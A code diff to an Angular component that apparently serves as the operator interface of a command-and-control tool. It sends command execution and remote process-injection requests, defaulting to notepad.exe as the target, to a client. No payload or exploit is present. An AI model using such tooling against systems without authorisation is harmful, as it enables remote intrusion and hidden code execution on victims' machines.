@@ -23,7 +23,7 @@ export class CmdExecComponent implements OnInit {
   @Input() clientId = "";
   downstreamId: string = "client"
 
-  // UI
+  // UI for all
   selectExecType: string = "cmd"
   
   // cmd, powershell
@@ -31,12 +31,14 @@ export class CmdExecComponent implements OnInit {
   
   // direct
   executable: string = "c:\\windows\\system32\\net.exe"
-
-  // direct, remote
   argline: string = ""
-  
   selectSpawnType: string = "standard"
   destination: string = "C:\\temp\\server.exe"
+
+  // remote
+  remote_file: string = ""
+  remote_argline: string = ""
+  remote_injectInto: string = "c:\\windows\\notepad.exe"
 
   constructor(
     private apiService: ApiService,
@@ -100,23 +102,22 @@ export class CmdExecComponent implements OnInit {
       params["executable"] = this.executable;
       params["argline"] = this.argline;
 
-      params["spawnType"] = this.selectSpawnType;
-      params["spawnData"] = this.destination;
-
+      if (this.selectSpawnType != "standard") {
+        params["spawnType"] = this.selectSpawnType;
+        params["spawnData"] = this.destination;
+      }
     } else if (this.selectExecType == "remote") {
       packetType = "execRemote";
 
-      params["filename"] = this.executable;
-      params["argline"] = this.argline;
+      params["filename"] = this.remote_file;
+      params["argline"] = this.remote_argline;
+      params["injectInto"] = this.remote_injectInto;
       params["type"] = "";
-      params["injectInto"] = this.destination;
 
     } else {
       console.log("Unknown: " + this.selectExecType);
       return;
     }
-    params["spawnType"] = this.selectSpawnType;
-    params["spawnData"] = this.destination;
 
     var packet = this.apiService.makePacket(
       this.clientId,
